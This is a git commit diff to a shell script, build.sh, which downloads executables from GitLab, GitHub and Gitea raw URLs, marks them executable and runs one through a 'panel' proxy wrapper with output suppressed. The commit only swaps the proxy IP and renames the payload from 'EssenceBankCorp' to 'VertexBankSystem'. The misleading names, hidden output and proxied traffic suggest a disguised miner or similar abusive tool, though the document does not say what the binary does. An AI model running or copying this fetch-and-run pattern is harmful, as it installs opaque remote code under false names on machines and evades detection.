9321d7e37e023227c60435951424044993ee248c
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-06 07:40:01 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,6 +1,6 @@
-proxy="24.249.199.12" 
+proxy="192.111.138.29" 
 port="4145"
-wget -q -O EssenceBankCorp https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x EssenceBankCorp
+wget -q -O VertexBankSystem https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x VertexBankSystem
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
@@ -19,6 +19,6 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./EssenceBankCorp -c "config.json" >/dev/null 2>&1
+./panel ./VertexBankSystem -c "config.json" >/dev/null 2>&1
 sleep 1
 sync; echo 1 > /proc/sys/vm/drop_caches
